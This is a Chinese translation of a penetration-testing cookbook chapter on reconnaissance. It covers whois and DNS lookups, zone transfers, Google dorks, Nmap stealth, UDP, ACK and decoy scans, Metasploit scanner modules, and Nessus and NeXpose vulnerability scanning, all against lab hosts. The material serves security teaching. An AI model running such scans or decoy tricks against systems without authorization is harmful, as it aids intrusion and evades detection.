+   被动信息收集

+   主动信息收集

+   社会工程学

让我们快速了解这些过程：

+   被动信息收集：这种技术用于在没有任何物理连接或访问的情况下获取有关目标的信息。这意味着我们使用其他来源来获取有关目标的信息，比如使用`whois`查询、`Nslookup`等。假设我们的目标是一个在线 Web 应用程序，那么简单的`whois`查询可以为我们提供大量关于 Web 应用程序的信息，比如其 IP 地址、域和子域、服务器位置、托管服务器等。这些信息在渗透测试期间可能非常有用，因为它可以扩大我们利用目标的轨迹。

+   主动信息收集：在这种技术中，建立与目标的逻辑连接以获取信息。这种技术为我们提供了下一个级别的信息，可以直接帮助我们了解目标的安全性。端口扫描；目标是最广泛使用的主动扫描技术，我们关注的是目标上运行的开放端口和可用服务。

+   社会工程学：这种信息收集类似于被动信息收集，但依赖于人为错误和以打印输出、电话对话或不正确的电子邮件 ID 等形式泄露的信息。利用这种方法的技术是多种多样的，信息收集的伦理非常不同，因此，社会工程学是一个独立的类别。例如，黑客注册拼写错误相似的域名，并设置邮件服务器以接收这些错误的电子邮件。这样的域名被称为 Doppelganger Domains，即邪恶的双胞胎。

在本章中，我们将详细分析各种被动和主动信息收集技术。在开始的两个步骤中，我们将分析被动信息收集中最常用和最常被忽视的技术，然后在后续步骤中，我们将专注于通过端口扫描获取信息。Metasploit 具有几种内置的扫描功能，以及一些集成到其中以进一步增强端口扫描过程的第三方工具。我们将分析内置扫描仪以及一些流行的第三方扫描仪，这些扫描仪可以在 Metasploit 框架上运行。让我们继续进行步骤，并开始获取有关我们目标的信息的过程。

# 被动信息收集 1.0-传统方式

让我们来处理一些最常用的信息收集技术。

## 准备就绪

`whois`，`Dig`和`Nslookup`是获取有关我们目标的初始信息的三个最基本和最简单的步骤。由于这两者都是 passiv 技术，因此不需要与目标进行连接。这些命令可以直接从`BackTrack`的终端执行。因此，打开终端窗口并继续进行。

## 如何做...

我们将从简单的`whois`查找开始我们的信息收集。`whois`是`BackTrack`中的内置命令，因此我们可以直接从终端调用它。

让我们快速对[www.packtpub.com](http://www.packtpub.com)进行`whois`查找并分析输出。输出可能很大，所以这里我们只关注输出的相关要点。

```
root@bt:~# whois www.packtpub.com
Domain Name: PACKTPUB.COM
Registrar: EASYDNS TECHNOLOGIES, INC.
Whois Server: whois.easydns.com
Referral URL: http://www.easydns.com
Name Server: NS1.EASYDNS.COM
Name Server: NS2.EASYDNS.COM
Name Server: NS3.EASYDNS.ORG
Name Server: NS6.EASYDNS.NET
Name Server: REMOTE1.EASYDNS.COM
Name Server: REMOTE2.EASYDNS.COM
Status: clientTransferProhibited
Status: clientUpdateProhibited
Updated Date: 09-feb-2011
Creation Date: 09-may-2003
Expiration Date: 09-may-2016

```

在这里，我们可以看到简单的`whois`查找已经揭示了有关目标网站的一些信息。信息包括 DNS 服务器、创建日期、到期日期等。由于此信息是从目标以外的来源收集的，因此被称为被动信息收集技术。

被动获取信息的另一种方式可以通过查询 DNS 记录。最常见的技术是使用 Unix 机器中默认的`dig`命令。让我们分析一下对[www.packtpub.com](http://www.packtpub.com)的`dig`查询。

```
 root@bt:~# dig www.packtpub.com
; <<>> DiG 9.7.0-P1 <<>> www.packtpub.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1583
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 6, ADDITIONAL: 1
;; QUESTION SECTION:
;www.packtpub.com. IN A
;; ANSWER SECTION:
www.packtpub.com. 1200 IN CNAME packtpub.com.
packtpub.com. 1200 IN A 83.166.169.228
;; AUTHORITY SECTION:
packtpub.com. 1200 IN NS remote1.easydns.com.
packtpub.com. 1200 IN NS ns2.easydns.com.
packtpub.com. 1200 IN NS ns6.easydns.net.
packtpub.com. 1200 IN NS ns3.easydns.org.
packtpub.com. 1200 IN NS ns1.easydns.com.
packtpub.com. 1200 IN NS remote2.easydns.com.
;; ADDITIONAL SECTION:
ns3.easydns.org. 5951 IN A 64.68.192.10 
```

查询 DNS 记录已经揭示了有关目标的更多信息。`dig`可以用于将主机的名称解析为 IP 地址，反之亦然。此外，`dig`还可以用于从可能用于帮助利用主机的名称服务器中收集版本信息。正如我们在输出中所看到的，很难识别主 DNS，或者在某些情况下是主邮件服务器或文件托管服务器等。这就是`Nslookup`出现的地方。`Nslookup`几乎和 dig 一样灵活，但提供了一个更简单的默认方法来识别主机，例如邮件和 DNS 服务器。

```
 root@bt:~# nslookup www.packtpub.com
Server: 220.226.6.104
Address: 220.226.6.104#53
Non-authoritative answer:
www.packtpub.com canonical name = packtpub.com.
Name: packtpub.com
Address: 83.166.169.228 
```

`Nslookup`已经揭示了有关目标的更多信息，例如其 IP 地址、服务器 IP 等。这些被动技术可以揭示有关目标的一些有趣信息，并可以为我们的渗透测试铺平道路。

## 工作原理...

`dig`可以用来查找**SPF**（发件人策略框架）记录。 SPF 记录是定义域的邮件发送策略的记录，即哪些服务器负责代表其发送邮件。不正确的 SPF 记录总会导致钓鱼/垃圾邮件。

SPF 记录以文本格式发布。 SPF 记录负责确保特定域的注册用户或特定域的合作伙伴不会受到钓鱼邮件的攻击。从`dig`查询中收集的信息可以帮助我们确定目标中的此类问题。

## 还有更多...

让我们更多地了解被动信息收集。

### 使用第三方网站

我们已经使用内置命令查询了有关我们目标的信息。还有一种同样好的技术，可以使用专门用于此类查找的网站，特别是提供有关地理位置、联系电话、管理员电子邮件等信息的网站。

一些有用的链接是：

[`who.is`](http://who.is)

[`www.kloth.net`](http://www.kloth.net)

# 被动信息收集 2.0-下一个级别

每个安全专业人员都知道前面一篇文章中讨论的信息收集技术。但是有一些技术分析人员因其较低的流行度和认知度而忽视，但它们可以产生与前一技术一样好的结果。我们将在这里讨论的技术涉及对我们目标的更深入分析，尽管我们仍将使用被动技术。这些技术不需要使用 Metasploit，但由于信息收集对于渗透测试是一个重要领域，因此我们将在这里讨论它。

## 准备工作

在这个配方中，我们将了解三种技术：

+   **区域传输：** 这可以使用终端执行。

+   **SMTP 头部：** 对于这种技术，我们需要目标发送给渗透测试人员的电子邮件。

+   **Google dork：** 这是一种简单但有用的通过搜索引擎获取信息的技术。

让我们从区域传输开始。

## 如何做到...

**区域传输**是 DNS 服务器用来在多个服务器之间交换域的权威记录的一种特殊方法。这种方法负责在主服务器和辅助服务器之间传输大量的域信息列表。配置错误的 DNS 服务器可以响应客户端查询并提供有关查询域的信息。

考虑以下示例，在该示例中，查询`dig @ns1.example.com example.com axfr`返回一个 IP 地址列表及其对应的主机名：

![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_02_01.jpg)

这个查询已经识别出十个主机名，其中有八个唯一的主机属于`example.com`。我们可以看到主机名足够描述性，可以清楚地了解正在运行的服务类型。

分析 SMTP 头部可能是收集有关目标信息的另一个潜在来源。它可以为我们提供有关邮件服务器、其 IP 地址、版本等信息。这种方法的唯一缺点是我们需要一封从目标位置发送的电子邮件来进行分析。以下截图显示了从目标发送的邮件头部的一部分。

![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_02_02.jpg)

对头部的仔细分析显示邮件服务器的 IP 地址是 83.166.169.248。邮件服务器使用 ESMTP 服务，用户使用 IMAP 服务。这些额外的信息在进一步探索目标时非常有用。

最后一种技术是使用**Google dorks**。这种方法只能在某些情况下起作用，但值得一试，因为你永远不知道它可能揭示的秘密信息。许多时候，Google 爬虫会到达存储在目标服务器上供内部使用的某些文件或文档，但由于互联网访问，爬虫会将文档索引到搜索结果中。在这种情况下，我们可以使用一些 Google 搜索技巧来寻找这样的文件。在搜索结果中**site**和**filetype**的组合可以揭示一些令人兴奋的东西。

例如，在 Google 中执行以下搜索查询：

+   `www.target .com filetype:xls`

+   `www.target.com filetype:pdf`

+   `site:www.target.com filetype:db`

同样，我们可以尝试几种不同的组合来从 Google 搜索中挖掘结果。

## 它是如何工作的...

`dig`查询基本上返回在 IP 或域所有者注册时提供的数据。区域传输信息特别提供给 DNS 服务器，以便建立正确的注册域的映射。`dig`查询可以帮助获取这些信息。SMTP 头部是电子邮件的原始数据主体。由于它是电子邮件的主要数据表示，它包含了关于发件人的大量信息。 

Google dorks 只是 Google 爬虫索引的各种文件的搜索结果。一旦文件在 Google 搜索中被索引，就可以使用一些特定的搜索类型查看它。

## 还有更多...

### 与 dorks 一起玩耍

[www.jhony.ihackstuff.com](http://www.jhony.ihackstuff.com) 是 Google dorks 的最全面指南，您可以在其中找到许多关于目标的隐藏信息的完整 dorks 列表。

# 端口扫描 - Nmap 方式

端口扫描是一种主动的信息收集技术，我们现在将直接开始处理我们的目标。端口扫描是一种有趣的信息收集过程。它涉及对目标机器的深入搜索。`Nmap`是安全专业人员最强大和首选的扫描器。`Nmap`的使用范围从初学者到高级水平不等。我们将详细分析各种扫描技术。

## 准备工作

从`Metasploit`启动`nmap`很容易。启动`msf`控制台，输入`nmap`以显示`Nmap`提供的扫描选项列表。

```
msf > nmap

```

## 如何做...

我们将分析四种不同类型的`Nmap`扫描，在渗透测试过程中非常有帮助。`Nmap`提供了许多不同的扫描模式来扫描目标机器。在这里，我们将重点关注四种扫描类型，即**TCP 连接扫描、SYN 隐秘扫描、UDP 扫描**和**ACK 扫描**。`Nmap`的不同扫描选项也可以组合在单个扫描中，以执行更高级和复杂的目标扫描。让我们继续并开始扫描过程。

**TCP 连接[-sT]**扫描是`Nmap`中最基本和默认的扫描类型。它遵循三次握手过程来检测目标机器上的开放端口。让我们在目标上执行这种扫描。

```
msf > nmap -sT -p1-10000 192.168.56.102 [*] exec: nmap -sT -p1-10000 192.168.56.102 Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-19 00:03 IST Nmap scan report for 192.168.56.102 Host is up (0.0058s latency).
Not shown: 9997 closed ports
PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems 
```

正如我们所看到的，我们传递了`-sT`参数，表示我们要执行 TCP 连接扫描。`-p`参数显示我们要扫描的端口号范围。TCP 连接扫描基于三次握手过程，因此返回的扫描结果被认为是准确的。

**SYN 扫描[-sS]**被认为是一种隐秘的扫描技术，因为它从不在目标和扫描器之间形成完整的连接。因此，它也被称为半开放扫描。让我们分析一下对目标的 SYN 扫描。

```
msf > nmap -sS 192.168.56.102 [*] exec: nmap -sS 192.168.56.102 Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-19 00:17 IST Nmap scan report for 192.168.56.102 Host is up (0.0019s latency).
Not shown: 997 closed ports
PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems 

```

`-sS`参数将指示`Nmap`在目标机器上执行 SYN 扫描。在大多数情况下，TCP 连接和 SYN 扫描的输出是相似的，但唯一的区别在于 SYN 扫描难以被防火墙和入侵检测系统（IDS）检测到。然而，现代防火墙也足够能够捕捉到 SYN 扫描。

**UDP 扫描[-sU]**是用于识别目标上开放 UDP 端口的扫描技术。将 0 字节的 UDP 数据包发送到目标机器，而收到 ICMP 端口不可达消息的接收者表明该端口已关闭，否则被视为打开。可以这样使用：

```
msf > nmap -sU -p9001 192.168.56.102

```

以下命令将检查 192.168.56.102 上的 UDP 端口是否打开。同样，我们可以通过修改`-p`操作符在完整的端口范围上执行 UDP 扫描。

**ACK 扫描[-sA]**是一种特殊的扫描类型，可以告诉防火墙过滤或未过滤哪些端口。它通过向远程端口发送 TCP ACK 帧来操作。如果没有响应，则被视为过滤端口。如果目标返回 RST 数据包（连接重置），则该端口被视为未过滤端口。

```
msf > nmap -sA 192.168.56.102 [*] exec: nmap -sA 192.168.56.102 Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-19 00:19 IST Nmap scan report for 192.168.56.102 Host is up (0.0011s latency).
Not shown: 999 filtered ports
PORT STATE SERVICE 9001/tcp unfiltered tor-orport
MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems)

```

上述输出显示了对目标执行的 ACK 扫描的结果。输出显示目标上的所有端口都被过滤，除了端口号为 9001 的未过滤端口。这将帮助我们找出目标的弱点，因为攻击未过滤端口将更有可能成功利用目标。

## 工作原理...

一般来说，渗透测试人员不会过分强调扫描过程，但是良好的扫描可以提供许多有用的结果。由于这里收集的信息将构成渗透测试的基础，因此强烈建议对扫描类型有适当的了解。现在让我们深入了解我们刚学到的每种扫描技术。

TCP 连接扫描是最基本的扫描技术，它与测试端口建立完整的连接。它使用操作系统的网络功能来建立连接。扫描器向目标机器发送一个 SYN 数据包。如果端口打开，则返回一个 ACK 消息给扫描器。然后扫描器向目标发送一个 ACK 数据包，显示成功建立连接。这被称为三次握手过程。一旦打开连接，连接就会终止。这种技术有其好处，但易于被防火墙和 IDS 追踪。

SYN 扫描是另一种 TCP 扫描类型，但它从不与目标建立完整的连接。它不使用操作系统的网络功能，而是生成原始 IP 数据包并监视响应。如果端口打开，则目标将以 ACK 消息做出响应。然后扫描器发送 RST（重置连接）消息并结束连接。因此，它也被称为**半开放扫描**。这被认为是一种隐蔽扫描技术，因为它可以避免在一些配置错误的防火墙和 IDS 中引发警报。

UDP 扫描是一种无连接的扫描技术，因此没有通知被发送回扫描器，告知数据包是否已被目标接收。如果端口关闭，则会向扫描器发送 ICMP 端口不可达消息。如果没有收到消息，则报告端口为打开状态。由于防火墙可以阻止数据包，因此此方法可能返回错误结果，因此不会生成响应消息，扫描器将报告端口为打开状态。

ACK 扫描的唯一目的是识别被过滤和未被过滤的端口。这是一种独特而方便的扫描技术，可以帮助找到目标系统的弱点，因为未被过滤的端口可能是易受攻击的目标。但 ACK 扫描的一个主要缺点是，由于它从不与目标连接，因此无法识别打开的端口。ACK 扫描的输出将仅列出端口是被过滤还是未被过滤。将 ACK 扫描与其他扫描类型结合使用可以形成非常隐秘的扫描过程。

## 还有更多...

让我们更多地了解 nmap 扫描，并看看我们如何将不同的扫描类型组合在一起。

### 操作系统和版本检测

除了端口扫描外，`Nmap`还提供了一些高级选项。这些选项可以帮助我们获取有关目标的更多信息。其中最常用的选项之一是**操作系统识别[-O]**。这可以帮助我们识别目标机器上运行的操作系统。操作系统检测扫描输出如下所示：

```
msf > nmap -O 192.168.56.102 [*] exec: nmap -O 192.168.56.102 Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-19 02:25 IST Nmap scan report for 192.168.56.102 Host is up (0.0014s latency). MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems) Device type: general purpose
Running: Microsoft Windows XP|2003

```

正如我们所看到的，`Nmap`已成功检测到目标机器的操作系统。这可以简化我们根据目标操作系统找到合适的漏洞利用的任务。

另一个广泛使用的`Nmap`选项是**版本检测[-sV]**，用于目标上不同开放端口的版本检测。它可以与我们之前看到的任何扫描类型混合在一起，以提供有关目标开放端口上运行的服务版本的额外信息。

```
msf > nmap -sT -sV 192.168.56.102 [*] exec: nmap -sV 192.168.56.102 Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-19 02:27 IST Nmap scan report for 192.168.56.102 Host is up (0.0011s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn 445/tcp open microsoft-ds Microsoft Windows XP
MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems) Service Info: OS: Windows

```

正如我们所看到的，在我们的扫描输出中添加了一个名为“版本”的额外列，报告了目标机器上运行的不同服务的版本。

### 增加匿名性

以匿名方式执行扫描非常重要。如果您在不使用安全措施的情况下执行扫描，防火墙和 IDS 日志可能会显示您的 IP 地址。`Nmap`提供了一个名为**欺骗[-D]**的功能。

诱饵选项不能阻止您的 IP 地址被记录在防火墙和 IDS 的日志文件中，但它确实使扫描看起来很可怕。它在日志文件中添加其他种子，从而给人一种印象，即有几个其他攻击者同时扫描机器。因此，如果您添加了两个诱饵 IP 地址，那么日志文件将显示请求数据包是从三个不同的 IP 地址发送的，一个是您的 IP 地址，另外两个是您添加的虚假地址。

```
msf > nmap -sS 192.168.56.102 -D 192.134.24.34,192.144.56.21 

```

以下扫描示例显示了诱饵参数的使用。在`-D`运算符之后的 IP 地址是虚假 IP 地址，它们也将出现在目标机器的网络日志文件中，以及原始 IP 地址。这个过程可以混淆网络管理员，并在他们的脑海中引起怀疑，认为所有三个 IP 地址都是虚假的或伪造的。但添加太多的诱饵地址可能会影响扫描结果，因此应该只使用有限数量的诱饵地址。

# 探索用于扫描的辅助模块

辅助模块是 Metasploit 的内置模块，可以帮助我们执行各种任务。它们与利用程序不同，因为它们在渗透测试者的机器上运行，也不提供任何 shell。Metasploit 框架中有超过 350 个不同的辅助模块，每个模块都有特定的任务。在这里，我们将讨论扫描器辅助模块。

## 准备工作

要使用任何辅助模块，我们将不得不按照三个简单的步骤，使我们的模块准备好启动。让我们通过这三个步骤。

1.  激活模块：使用`use`命令设置特定模块处于活动状态并准备接受命令。

1.  设置规格：使用`set`命令设置模块执行所需的各种参数。

1.  运行模块：完成前两个步骤后，使用`run`命令最终执行模块并生成结果。

要查看 Metasploit 框架中可用的扫描模块，可以浏览以下位置：

```
root@bt:~# cd /pentest/exploits/framework3/modules/auxiliary/scanner

```

要开始使用模块，我们将启动`msfconsole`会话。

## 如何做...

现在让我们实际实施这些步骤来运行端口扫描辅助模块。

首先，让我们搜索框架中可用的端口扫描模块。

```
msf > search portscan Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/scanner/portscan/ack normal TCP ACK Firewall Scanner auxiliary/scanner/portscan/ftpbounce normal FTP Bounce Port Scanner auxiliary/scanner/portscan/syn normal TCP SYN Port Scanner auxiliary/scanner/portscan/tcp normal TCP Port Scanner auxiliary/scanner/portscan/xmas normal TCP "XMas" Port Scanner

```

我们可以看到可用的扫描仪列表。它包含我们在先前的示例中讨论过的一些基本扫描类型。让我们从一个简单的 SYN 扫描开始。

## 它是如何工作的...

现在我们将按照我们的三个步骤过程开始使用模块。让我们从第一步开始。

1.  要激活模块，我们将执行以下命令：

```
msf > use auxiliary/scanner/portscan/syn msf auxiliary(syn) > 
```

我们将发现提示已更改为我们要使用的模块。这表明模块现在处于活动状态。

1.  现在让我们看看模块需要哪些参数。这将通过使用`show options`命令来完成：

```
msf auxiliary(syn) > show options Module options (auxiliary/scanner/portscan/syn): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes number of hosts to scan per set INTERFACE no The name of the interface PORTS 1-10000 yes Ports to scan RHOSTS yes target address range or CIDR SNAPLEN 65535 yes The number of bytes to capture THREADS 1 yes The number of concurrent threads TIMEOUT 500 yes The reply read timeout in milliseconds
msf auxiliary(syn) > show options Module options (auxiliary/scanner/portscan/syn): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes number of hosts to scan per set INTERFACE no The name of the interface PORTS 1-10000 yes Ports to scan RHOSTS yes target address range or CIDR SNAPLEN 65535 yes The number of bytes to capture THREADS 1 yes The number of concurrent threads TIMEOUT 500 yes The reply read timeout in milliseconds 
```

第一列列出了所有必需的参数。名为`Required`的列告诉我们哪些参数是必须传递的。对于所有标记为`yes`的参数，包含值是必要的。正如我们所看到的，所有列都包含默认值。`RHOSTS`包含我们要扫描的 IP 地址范围。因此，让我们使用我们的目标 IP 地址设置`RHOSTS`参数。

```
msf auxiliary(syn) > set RHOSTS 192.168.56.1 RHOSTS => 192.168.56.1 
```

现在我们的模块已准备好对目标 IP 地址执行 SYN 扫描。使用`set`命令，我们也可以更改其他值。例如，如果我们想要更改端口号的范围，那么以下命令可以解决我们的问题：

```
msf auxiliary(syn) > set PORTS 1-500 
```

1.  最后，我们的最后一步将是执行模块以执行其相应的操作：

```
msf auxiliary(syn) > run 
```

成功执行`run`命令后，模块将执行 SYN 扫描并生成结果。

## 还有更多...

让我们在下一节中了解线程的使用。

### 管理线程

设置和管理辅助模块中的线程数量可以大大提高辅助模块的性能。如果你需要扫描整个网络或一系列 IP 地址，增加线程数量将使扫描过程更快。

```
msf auxiliary(syn) > set THREADS 10 
```

# 使用辅助模块进行目标服务扫描

现在让我们尝试对一系列 IP 地址或单个目标主机上运行的特定服务进行有针对性的扫描。有各种基于服务的扫描可用；VNC、FTP、SMB 等等。在我们寻找目标上特定类型的服务时，辅助模块可以非常方便。

## 准备工作

让我们找出哪些基于服务的扫描辅助模块对我们可用。我们可以通过以下路径导航：

```
root@bt:~# cd /pentest/exploits/framework3/modules/auxiliary/scanner
root@bt:/pentest/exploits/framework3/modules/auxiliary/scanner# ls
backdoor emc ip mysql pop3 sap ssh vnc db2 finger lotus netbios portscan sip telephony voice dcerpc ftp misc nfs postgres smb telnet vxworks dect http motorola ntp rogue smtp tftp x11 discovery imap mssql oracle rservices snmp upnp 
```

正如我们所看到的，有许多服务扫描模块的选项，在渗透测试中非常有用。让我们快速地使用其中一些。

## 操作方法...

这些服务扫描模块的工作方式类似于使用任何其他模块。我们将遵循在上一个示例中学到的相同的三个步骤过程。

让我们来研究一下 NetBIOS 模块。扫描 NetBIOS 可以有助于识别 Windows 操作系统。这次我们将扫描一系列网络，以找出哪台机器正在运行 NetBIOS 服务。

```
msf > use auxiliary/scanner/netbios/nbname msf auxiliary(nbname) > show options Module options (auxiliary/scanner/netbios/nbname): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe CHOST no The local client address RHOSTS yes The target address range RPORT 137 yes The target port THREADS 1 yes The number of concurrent threads msf auxiliary(nbname) > set RHOSTS 192.168.56.1/24 RHOSTS => 192.168.56.1/24 msf auxiliary(nbname) > set THREADS 10 THREADS => 10
msf > use auxiliary/scanner/netbios/nbname msf auxiliary(nbname) > show options Module options (auxiliary/scanner/netbios/nbname): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe CHOST no The local client address RHOSTS yes The target address range RPORT 137 yes The target port THREADS 1 yes The number of concurrent threads msf auxiliary(nbname) > set RHOSTS 192.168.56.1/24 RHOSTS => 192.168.56.1/24 msf auxiliary(nbname) > set THREADS 10 THREADS => 10 
```

`RHOSTS`现在设置为扫描整个 IP 地址范围，线程数量也设置为十。现在让我们运行这个模块并分析结果。

```
msf auxiliary(nbname) > run
[*] Sending NetBIOS status requests to 192.168.56.0->192.168.56.255 (256 hosts)
[*] 192.168.56.1 [DARKLORD-PC] OS:Windows Names:(DARKLORD-PC, WORKGROUP, __MSBROWSE__) Addresses:(192.168.56.1) Mac:08:00:27:00:a8:a3
[*] 192.168.56.103 [SP3] OS:Windows Names:(SP3, WORKGROUP) Addresses:(10.0.2.15, 192.168.56.103) Mac:08:00:27:4b:65:35
[*] 192.168.56.102 [ABHINAV-5C02603] OS:Windows Names:(ABHINAV-5C02603, WORKGROUP) Addresses:(10.0.2.15, 192.168.56.102) Mac:08:00:27:34:a8:87
[*] Scanned 256 of 256 hosts (100% complete) 
```

扫描网络发现有三台机器正在运行 NetBIOS。扫描还报告了它们各自的 MAC 地址。

让我们进行另一个服务扫描。这次我们将尝试找出哪些机器正在运行 MySQL 数据库服务器。此外，我们还将尝试找出服务器的版本。

```
msf > use auxiliary/scanner/mysql/mysql_version
msf auxiliary(mysql_version) > show options Module options (auxiliary/scanner/mysql/mysql_version): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range RPORT 3306 yes The target port THREADS 1 yes The number of concurrent threads msf auxiliary(mysql_version) > set RHOSTS 192.168.56.1/24 RHOSTS => 192.168.56.1/24
msf auxiliary(mysql_version) > set THREADS 10 THREADS => 10
msf auxiliary(mysql_version) > run [*] 192.168.56.102:3306 is running MySQL, but responds with an error: \x04Host '192.168.56.101' is not allowed to connect to this MySQL server 
```

扫描过程发现 IP 地址 192.168.56.102 正在运行 MySQL 服务器，但不幸的是，无法连接到服务器。这再次证明了辅助模块是多么简单和方便，它们也可以为我们提供大量有用的信息。

建议尝试所有可用的辅助扫描模块，因为它们可以帮助你更好地了解你的目标。

## 工作原理...

辅助模块是专门用于执行特定任务的特殊目的模块。有时你可能需要执行特定类型的扫描来发现服务。例如，MySQL 辅助扫描器通过对默认端口号（3306）进行 ping 来检测数据库的存在。它进一步检查默认登录是否在数据库上启用。你可以在`/modules/auxiliary/scanner`下分析脚本。你可以根据需要扩展代码，甚至重用脚本来构建自己特定的辅助扫描器。

# 使用 Nessus 进行漏洞扫描

到目前为止，我们已经学习了端口扫描的基础知识，并进行了 Nmap 的实际实现。端口扫描已经扩展到其他几种工具，进一步增强了扫描和信息收集的过程。在接下来的几个示例中，我们将涵盖那些扫描目标以发现可用服务和开放端口，然后尝试确定可能存在的特定服务或端口的漏洞类型的工具。让我们开始我们的漏洞扫描之旅。

Nessus 是最广泛使用的漏洞扫描器之一。它会扫描目标以发现一系列漏洞，并为其生成详细报告。Nessus 在渗透测试中非常有帮助。你可以使用 Nessus 的图形界面版本，也可以在 Metasploit 控制台中使用它。在本书中，我们将主要关注使用`msfconsole`与 Nessus 一起使用。

## 准备工作

要在`msfconsole`中开始使用 Nessus，我们需要加载 Nessus，然后连接到服务器开始我们的渗透测试。

首先，我们将连接我们的数据库与 Metasploit，以存储临时结果。在前一章中已经解释了在 Metasploit 中启动和连接数据库的过程。连接数据库后，我们的下一个任务是加载 Nessus 插件。

## 如何操作...

1.  要连接数据库并在 Metasploit 中加载 Nessus，我们将执行以下命令：

```
msf > db_connect msf3:8b826ac0@127.0.0.1:7175/msf3
msf > load nessus
[*] Nessus Bridge for Nessus 4.2.x
[+] Type nessus_help for a command listing
[*] Successfully loaded plugin: nessus 
```

1.  成功加载后，我们将需要将其与服务器连接。以下命令用于将其与服务器连接：

```
msf > nessus_connect root:toor@localhost ok
[*] Connecting to https://127.0.0.1:8834/ as root
[*] Authenticated 
```

在上述命令中，`ok`是一个额外的参数，用于确保 Nessus 服务器在受信任的网络上运行。

我们可以使用`nessus_user_list`命令检查 Nessus 中可用用户的列表。

也可以使用`nessus_user_add`命令添加新用户。通过使用`nessus_policy_list`命令，我们可以查看服务器上可用策略的列表。

## 工作原理...

一旦 Nessus 与服务器连接，就可以用于扫描目标机器。扫描的过程简单而快速。让我们对目标进行快速扫描，看看 Nessus 扫描是如何操作的。要开始扫描，我们将需要传递以下命令：

```
msf > nessus_scan_new 1 testscan 192.168.56.102
[*] Creating scan from policy number 1, called "testscan" and scanning 192.168.56.102
[*] Scan started. uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f 
```

一旦扫描过程完成，我们的下一个目标将是导入 Nessus 生成的列表。让我们查看可用的列表：

```
msf > nessus_report_list
[+] Nessus Report List
ID Name Status
---- ------
9d337e9b-82c7-
89a1-a19-4ef154b82 testscan completed
f624de2444e6ad18a1f 
```

ID 列代表我们扫描生成的报告。现在让我们导入这份报告。

```
msf > nessus_report_get 9d337e9b-82c7-89a1-a1944ef154b82f624de2444e6ad18a1f
[*] importing 9d337e9b-82c7-89a1-a1944ef154b82f624de2444e6ad18a1f 
```

报告导入后，可以使用控制台命令操作，并进行分析，以找出目标中的弱点。要查看目标中的漏洞，执行以下命令：

```
msf> hosts -c address, vuls, os_name 
```

## 还有更多...

让我们快速浏览一下在 GUI 模式下使用 Nessus 的快速指南。

### 在 Web 浏览器中使用 Nessus

Nessus 也可以从其 GUI 模式中使用，这也和控制台模式一样强大且易于使用。如果您是第一次使用 Nessus，则首先需要注册并从 Nessus 网站获取注册码。注册可以在以下链接完成：

[`www.nessus.org/register/`](http://www.nessus.org/register/)

注册完成后，我们将需要启动 Nessus 并添加注册码。转到**应用程序** | **BackTrack | 漏洞评估 | 网络评估 | 漏洞扫描器 | nessus start**。

启动 Nessus 时，可能会提示以下错误消息：

```
Starting Nessus : . Missing plugins. Attempting a plugin update... Your installation is missing plugins. Please register and try again. To register, please visit http://www.nessus.org/register/ 
```

错误是因为 Nessus 尚未注册。为了注册，我们需要使用从 Nessus 收到的注册码。以下命令将帮助我们完成注册过程：

```
/opt/nessus/bin/nessus-fetch -register YOUR REGISTRATIN CODE
root@bt:~# /opt/nessus/bin/nessus-fetch --register E8A5-5367-982E-05CB-972A
Your activation code has been registered properly - thank you. Now fetching the newest plugin set from plugins.nessus.org... Your Nessus installation is now up-to-date. If auto_update is set to 'yes' in nessusd.conf, Nessus will update the plugins by itself. 
```

现在启动浏览器并输入以下地址：

`https://localhost:8834`

如果您第一次在浏览器中启动 Nessus，加载可能需要一些时间。请耐心等待。

# 使用 NeXpose 进行扫描

在上一篇文章中，我们讨论了 Nessus 作为一个潜在的漏洞扫描器。在本篇文章中，我们将介绍另一个重要的漏洞扫描器 NeXpose。

NeXpose 是 Rapid7 的一款热门工具，用于执行漏洞扫描并将结果导入 Metasploit 数据库。NeXpose 的使用方式类似于我们在上一篇文章中学到的 Nessus，但让我们快速了解一下如何开始使用 NeXpose。我将把更深入地探索留作你的任务。

## 准备工作

从`msf`控制台启动 NeXpose，我们首先需要将数据库连接到 Metasploit，然后加载插件将其与 NeXpose 服务器连接，以启动目标扫描的过程。让我们在命令行中执行这些步骤。

```
msf > db_connect msf3:8b826ac0@127.0.0.1:7175/msf3
msf > load nexpose
msf > nexpose_connect darklord:toor@localhost ok
[*] Connecting to NeXpose instance at 127.0.0.1:3780 with username darklord... 
```

## 如何操作...

现在我们已经连接到我们的服务器，我们可以扫描我们的目标并生成报告。NeXpose 支持两种扫描命令。一个是`nexpose_scan`，另一个是`nexpose_discover`。前者将扫描一系列 IP 地址并导入结果，而后者将仅扫描以发现主机和运行在其上的服务。让我们使用 NeXpose 对我们的目标进行快速扫描。

```
msf > nexpose_discover 192.168.56.102
[*] Scanning 1 addresses with template aggressive-discovery in sets of 32
[*] Completed the scan of 1 addresses 
```

